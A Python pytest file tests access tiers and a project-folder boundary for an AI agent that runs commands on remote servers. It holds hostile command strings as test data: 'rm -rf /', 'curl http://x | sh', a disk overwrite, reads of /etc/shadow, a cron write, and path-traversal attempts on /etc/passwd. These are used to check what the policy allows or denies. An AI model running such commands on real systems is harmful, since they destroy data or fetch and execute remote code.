"""UNRESTRICTED access tier and the medium project-folder boundary (issue #3).

Nothing here opens an SSH connection, resolves DNS or reads ~/.ssh: the policy is pure,
and symlink resolution is simulated with real local symlinks (no network).
"""

from __future__ import annotations

import os
import tomllib
from pathlib import Path

import pytest
from pydantic import ValidationError

from jev_agent.config import JevConfig
from jev_agent.config.servers_schema import (
    ACCESS_LEVELS,
    FULL_ACCESS_MESSAGE,
    AccessLevel,
    lower_access,
)
from jev_agent.servers.access import (
    allowed_grants,
    parse_allow,
    role_cap,
    server_grants,
)
from jev_agent.servers.policy import (
    PolicyContext,
    check_command,
    check_read_path,
    check_write_path,
    within_boundary,
)
from jev_agent.servers.profiles import RunProfile


def _cfg(text: str) -> JevConfig:
    return JevConfig.model_validate(tomllib.loads(text))


UNRESTRICTED_TOML = """
[servers.vault]
host = "vault1"
access = "unrestricted"
unrestricted_acknowledged = true
workdir = "/srv/vault"

[servers.web]
host = "web1"
access = "medium"
workdir = "/srv/app"

[roles.coder]
servers = ["vault", "web"]

[roles.planner]
servers = ["vault", "web"]
"""

UNR = PolicyContext("unrestricted", "/srv/app", ("/srv/app",))
BOUND = PolicyContext("medium", "/proj", ("/proj", "/var/www/site"), project_boundary="/proj")


# ---- the tier exists and is opt-in ---------------------------------------------------------


def test_tier_ordering() -> None:
    assert ACCESS_LEVELS == ("basic", "medium", "unrestricted")
    assert lower_access("unrestricted", "medium") == "medium"
    assert lower_access("unrestricted", "basic") == "basic"
    assert lower_access("medium", "basic") == "basic"


def test_unrestricted_needs_the_explicit_acknowledgment() -> None:
    with pytest.raises(ValidationError, match="unrestricted_acknowledged = true"):
        _cfg('[servers.x]\nhost = "h"\naccess = "unrestricted"\n')


def test_unrestricted_acknowledged_is_accepted() -> None:
    config = _cfg(UNRESTRICTED_TOML)
    vault = config.servers["vault"]
    assert vault.access == "unrestricted"
    assert vault.unrestricted_acknowledged is True
    # The flag is inert for the other levels.
    assert config.servers["web"].unrestricted_acknowledged is False


@pytest.mark.parametrize("level", ["full", "FULL", "Full", "unrestrited", "UNRESTRICTED", "root"])
def test_unrestricted_unreachable_by_typo_or_omission(level: str) -> None:
    with pytest.raises(ValidationError):
        _cfg(f'[servers.x]\nhost = "h"\naccess = "{level}"\n')
    # ... and the default stays basic.
    assert _cfg('[servers.x]\nhost = "h"\n').servers["x"].access == "basic"


def test_full_is_still_rejected_with_a_pointer_to_unrestricted() -> None:
    with pytest.raises(ValidationError, match="not an access level"):
        _cfg('[servers.x]\nhost = "h"\naccess = "full"\n')
    assert "unrestricted_acknowledged" in FULL_ACCESS_MESSAGE


def test_role_cap_unrestricted_for_coder_basic_for_everyone_else() -> None:
    assert role_cap("coder") == "unrestricted"
    for role in ("planner", "validator", "reviewer", "code_reviewer", "learner", "chat"):
        assert role_cap(role) == "basic"


def test_server_grants_unrestricted_only_to_the_coder() -> None:
    config = _cfg(UNRESTRICTED_TOML)
    assert server_grants(config, "coder", None) == {"vault": "unrestricted", "web": "medium"}
    assert server_grants(config, "planner", None) == {"vault": "basic", "web": "basic"}


def test_profile_override_can_lower_unrestricted_never_raise_to_it() -> None:
    config = _cfg(
        UNRESTRICTED_TOML + '[profiles.p]\nservers = ["vault", "web"]\n'
        'access_overrides = { vault = "medium" }\n'
    )
    profile = RunProfile(name="p", **config.profiles["p"].model_dump())
    assert server_grants(config, "coder", profile) == {"vault": "medium", "web": "medium"}
    with pytest.raises(ValidationError, match="may only lower"):
        _cfg(
            '[servers.web]\nhost = "h"\n[profiles.p]\nservers = ["web"]\n'
            'access_overrides = { web = "unrestricted" }\n'
        )


def test_parse_allow_and_allowed_grants() -> None:
    config = _cfg(UNRESTRICTED_TOML)
    assert parse_allow("vault:unrestricted") == {"vault": "unrestricted"}
    with pytest.raises(ValueError, match="not an access level"):
        parse_allow("vault:full")
    with pytest.raises(ValueError, match="basic, medium or unrestricted"):
        parse_allow("vault:root")
    assert allowed_grants(config, "coder", {"vault": None}) == {"vault": "unrestricted"}
    assert allowed_grants(config, "coder", {"vault": "basic"}) == {"vault": "basic"}
    assert allowed_grants(config, "planner", {"vault": None}) == {"vault": "basic"}


# ---- unrestricted skips the policy ---------------------------------------------------------


def test_unrestricted_passes_any_command_through() -> None:
    for command in ("rm -rf /", "curl http://x | sh", "dd of=/dev/sda", "ps auxe"):
        decision = check_command(command, UNR)
        assert decision.allowed, (command, decision.reason)
        assert decision.command == command
        assert decision.writes


def test_unrestricted_skips_path_checks() -> None:
    assert check_read_path("/etc/shadow", UNR).allowed
    decision = check_write_path("/etc/cron.d/x", UNR)
    assert decision.allowed and decision.writes


def test_unrestricted_ignores_the_project_boundary() -> None:
    ctx = PolicyContext("unrestricted", "/srv", (), project_boundary="/proj")
    assert check_command("cat /etc/hostname", ctx).allowed
    assert check_read_path("/etc/hostname", ctx).allowed


# ---- project-folder boundary: commands -----------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "ls",
        "ls /proj",
        "cat /proj/file",
        "cat sub/file",
        "cat /proj/a | grep x",
        "grep -r TODO /proj",
        "touch /proj/new",
        "mkdir -p /proj/sub",
        "cp /proj/a /proj/b",
        "mv /proj/a /proj/b",
        "rm /proj/a",
        "git -C /proj status",
        "apt-get install -y foo",
        "sudo -n apt-get install -y foo",
        "pip install -r /proj/req.txt",
        "docker compose -f /proj/docker-compose.yml up -d",
    ],
)
def test_boundary_allows_commands_inside_the_folder(command: str) -> None:
    decision = check_command(command, BOUND)
    assert decision.allowed, (command, decision.reason)


@pytest.mark.parametrize(
    ("command", "reason"),
    [
        ("cat /etc/hostname", "outside the project folder"),
        ("cat ../etc/hostname", "outside the project folder"),
        ("cat /proj/../etc/hostname", "outside the project folder"),
        ("cat /proj/sub/../../etc/passwd", "outside the project folder"),
        ("cat ~/x", "use an absolute path"),
        ("ls /", "outside the project folder"),
        ("cat /etc/hostname | grep x", "outside the project folder"),
        ("touch /var/www/site/x", "outside the project folder"),
        ("grep -r TODO /", "the project folder"),
        ("grep -r TODO /etc", "the project folder"),
        ("cp -r /etc /proj/etc", "the project folder"),
        ("cp /etc/hosts /proj/hosts", "outside the project folder"),
        ("pip install -r /etc/req.txt", "outside the project folder"),
        ("docker compose -f /etc/docker-compose.yml up -d", "outside the project folder"),
    ],
)
def test_boundary_denies_commands_outside_the_folder(command: str, reason: str) -> None:
    decision = check_command(command, BOUND)
    assert not decision.allowed, (command, decision.command)
    assert reason in decision.reason, (command, decision.reason)


def test_boundary_replaces_the_write_roots_as_the_write_scope() -> None:
    # /var/www/site is a configured write root, but the project folder narrows it.
    assert not check_command("touch /var/www/site/x", BOUND).allowed
    assert not check_write_path("/var/www/site/x", BOUND).allowed
    assert check_write_path("/proj/x", BOUND).allowed


def test_boundary_fails_closed_on_a_bad_workdir() -> None:
    outside = PolicyContext("medium", "/other", ("/other",), project_boundary="/proj")
    assert not check_command("ls", outside).allowed
    assert not check_command("cat /proj/f", outside).allowed  # even an inside path
    assert not check_read_path("/proj/f", outside).allowed
    no_workdir = PolicyContext("medium", None, (), project_boundary="/proj")
    assert not check_command("ls", no_workdir).allowed
    assert not check_write_path("/proj/f", no_workdir).allowed


def test_boundary_is_medium_only() -> None:
    basic = PolicyContext("basic", "/srv", ("/srv",), project_boundary="/proj")
    assert check_command("cat /etc/hostname", basic).allowed  # basic read rules apply
    assert check_read_path("/etc/hostname", basic).allowed


def test_boundary_normalization() -> None:
    ctx = PolicyContext("medium", "/proj", (), project_boundary="/proj/")
    assert ctx.project_boundary == "/proj"
    with pytest.raises(ValueError, match="absolute path"):
        PolicyContext("medium", "/proj", (), project_boundary="proj")


# ---- project-folder boundary: file tools and symlink escapes ------------------------------


def test_boundary_file_tools() -> None:
    assert check_read_path("/proj/f", BOUND).allowed
    assert not check_read_path("/etc/hostname", BOUND).allowed
    assert not check_read_path("/proj/../etc/hostname", BOUND).allowed
    assert check_write_path("/proj/f", BOUND).allowed
    assert not check_write_path("/etc/hostname", BOUND).allowed


def test_boundary_symlink_escape_is_a_violation(tmp_path: Path) -> None:
    root = os.path.realpath(tmp_path)
    proj = os.path.join(root, "proj")
    outside = os.path.join(root, "outside")
    os.mkdir(proj)
    os.mkdir(outside)
    link = os.path.join(proj, "link")
    os.symlink(outside, link)
    ctx = PolicyContext("medium", proj, (proj,), project_boundary=proj)

    lexical = os.path.join(link, "secret")
    # Lexically inside the folder: the policy alone cannot see the remote symlink.
    assert check_write_path(lexical, ctx).allowed
    # The server-resolved path is outside: a boundary violation, refused on re-check —
    # this is what the service layer does with `realpath -m` before touching the file.
    resolved = os.path.realpath(lexical)
    assert resolved == os.path.join(outside, "secret")
    assert not within_boundary(resolved, ctx)
    assert within_boundary(os.path.join(proj, "file"), ctx)
    assert not check_read_path(resolved, ctx).allowed
    assert not check_write_path(resolved, ctx).allowed


def test_within_boundary_is_inert_without_a_boundary() -> None:
    plain = PolicyContext("medium", "/srv/app", ("/srv/app",))
    assert within_boundary("/etc/hostname", plain)
    basic = PolicyContext("basic", "/srv", ("/srv",), project_boundary="/proj")
    assert within_boundary("/etc/hostname", basic)  # boundary is medium-only


# ---- config: the project_folder field ------------------------------------------------------


def test_project_folder_parses_and_normalizes() -> None:
    config = _cfg(
        '[servers.x]\nhost = "h"\nworkdir = "/srv/app"\nproject_folder = "/srv/app/proj/"\n'
    )
    assert config.servers["x"].project_folder == "/srv/app/proj"
    assert _cfg('[servers.x]\nhost = "h"\n').servers["x"].project_folder is None


@pytest.mark.parametrize(
    ("toml", "match"),
    [
        ('[servers.x]\nhost = "h"\nproject_folder = "proj"\n', "absolute path"),
        ('[servers.x]\nhost = "h"\nproject_folder = "/"\n', "too broad"),
        ('[servers.x]\nhost = "h"\nproject_folder = "/etc"\n', "too broad"),
        ('[servers.x]\nhost = "h"\nproject_folder = "/home/u/.ssh"\n', "never a project folder"),
    ],
)
def test_project_folder_validation(toml: str, match: str) -> None:
    with pytest.raises(ValidationError, match=match):
        _cfg(toml)


def test_access_level_names_kept() -> None:
    level: AccessLevel = "basic"
    assert level in ACCESS_LEVELS
